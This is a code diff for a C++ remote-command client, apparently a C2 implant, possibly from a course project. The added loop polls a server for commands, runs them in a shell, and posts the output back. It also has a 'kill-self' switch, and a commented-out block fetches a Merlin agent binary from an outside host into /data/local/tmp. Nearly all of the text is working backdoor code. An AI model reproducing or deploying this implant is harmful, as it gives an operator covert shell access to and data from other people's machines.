@@ -2,6 +2,8 @@
 #include <vector>
 #include <stdio.h>
 #include <stdlib.h>
+#include <thread>
+#include <chrono>
 #include <iostream>
 #include "curl/curl.h"
 
@@ -166,47 +168,60 @@ void parse_command(Command &cmd, string str){
 }
 
 
-void Check_Num_Send_to_Terminal(Command obj){
+string Check_Num_Send_to_Terminal(Command obj){
     string res;
     if(CLIENTNUMBER == obj.ClientNumber && LASTCOMMAND != obj.command){
         res = send_to_terminal(obj.command);
-        cout << res << endl;
         LASTCOMMAND = obj.command;
+        return res;
     }else{
-        return;
+        return "NULL";
     }
 }
 
 
 int main() {
     string os_name = get_os_name();
-    cout << os_name << endl;
 
     //Connect to server and get client number
     CLIENTNUMBER = 1;
-    LASTCOMMAND = "";
-
-    //Post Test
-    string testOutput;
-    send_terminal_back(1, "This is a test message");
-    cout << endl;
-
-
-    //Get Test
-    string outputTest = get_command();
-    outputTest = strip_responce_string(outputTest);
-
-    //Put data in this struct to hold for later use.
-    struct Command newCmd;
-    parse_command(newCmd, outputTest);
-
-    //Apply command if for correct machine
-    Check_Num_Send_to_Terminal(newCmd);
-
-
-    //cout << outputTest << endl;
+    LASTCOMMAND = "";    
 
     if (os_name == "Linux") {
+        while(1)
+        {
+            //GET data
+            string outputTest = get_command();
+            outputTest = strip_responce_string(outputTest);
+
+            //Parse Data for Use
+            struct Command newCmd;
+            parse_command(newCmd, outputTest);
+
+            if(newCmd.command == "\"kill-self\"")
+            {
+                //self delete the program
+                return 0;
+            }
+
+            //Wait to see if the command is updated
+            if(newCmd.command == LASTCOMMAND)
+            {
+                //wait 5 seconds to check for update
+                this_thread::sleep_for(chrono::seconds(5));
+            }else{
+                //Use Command
+                string sysResponce;
+                sysResponce = Check_Num_Send_to_Terminal(newCmd);
+                if(sysResponce != "NULL")
+                {
+                    //POST system responce to server
+                    sysResponce = "\"" + sysResponce + "\"";
+                    send_terminal_back(CLIENTNUMBER, sysResponce);
+                    cout << endl;
+                }
+            }
+        }
         /*string merlin = "/data/local/tmp/merlin";
 
         download_file("http://cs4001.root.sx/android/merlinAgent-Android-arm", merlin);
